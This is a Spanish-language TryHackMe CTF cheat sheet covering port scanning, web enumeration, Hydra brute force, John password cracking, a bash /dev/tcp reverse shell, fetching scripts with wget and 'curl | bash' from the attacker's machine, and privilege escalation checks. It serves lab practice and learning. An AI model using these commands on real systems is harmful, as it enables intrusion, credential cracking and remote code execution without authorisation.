# Chuleta CTF — TryHackMe

Referencia rápida de comandos. Reemplaza `<IP>` / `<dominio>` según el despliegue.

## 0. Setup
```bash
# VPN THM conectada → tu IP en tun0
ip a show tun0
# añadir hostname .thm
echo "<IP>  target.thm" | sudo tee -a /etc/hosts
```

## 1. Recon de puertos
```bash
nmap -sC -sV -p- -T4 <IP> -oN nmap.txt      # todo TCP, scripts + versiones
nmap -sU --top-ports 20 <IP>                # UDP top 20
```

## 2. Web
```bash
gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -t 50
gobuster vhost -u http://<dominio> -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
whatweb http://<IP>/                         # fingerprint
ffuf -u http://<IP>/FUZZ -w <wordlist>       # alternativa a gobuster
```

## 3. Fuerza bruta (Hydra)
```bash
# SSH
hydra -l <user> -P /usr/share/wordlists/rockyou.txt ssh://<IP>
# formulario POST (F= = mensaje de error REAL)
hydra -l admin -P rockyou.txt <IP> http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid"
```

## 4. Cracking (John)
```bash
# patrón *2john → hash → john
zip2john file.zip > h.txt          # ZIP cifrado
ssh2john id_rsa > h.txt            # clave SSH con passphrase (/opt/john/ssh2john.py)
unshadow passwd shadow > h.txt     # /etc/passwd + /etc/shadow
john h.txt --wordlist=/usr/share/wordlists/rockyou.txt
john h.txt --format=raw-md5 --wordlist=rockyou.txt
john h.txt --show
# identificar hash
hashid '<hash>'
```

## 5. Shells
```bash
# listener
nc -lvnp 4444
# reverse bash
bash -i >& /dev/tcp/<MI_IP>/4444 0>&1
# estabilizar TTY
python3 -c 'import pty;pty.spawn("/bin/bash")'   # luego Ctrl+Z; stty raw -echo; fg
```
Payloads: https://revshells.com

## 6. Transferir archivos
```bash
# en mi máquina
python3 -m http.server 80
# en la víctima
wget http://<MI_IP>/linpeas.sh -O /tmp/lp.sh
curl http://<MI_IP>/lp.sh | bash
```

## 7. Privesc
```bash
# Linux
sudo -l                                   # qué puedo correr como root
find / -perm -4000 -type f 2>/dev/null    # SUID → GTFOBins
./linpeas.sh                              # enum automática
# Windows
whoami /priv
systeminfo                                # para buscar exploits de kernel
```
- GTFOBins: https://gtfobins.github.io · LOLBAS (Win): https://lolbas-project.github.io

## 8. Reverse / análisis estático rápido
```bash
file binario; strings binario | grep -iE 'http|pass|flag'
Format-Hex x.exe | Select -First 1        # magic (MZ=PE, 7F454C46=ELF)
echo <b64> | base64 -d
```
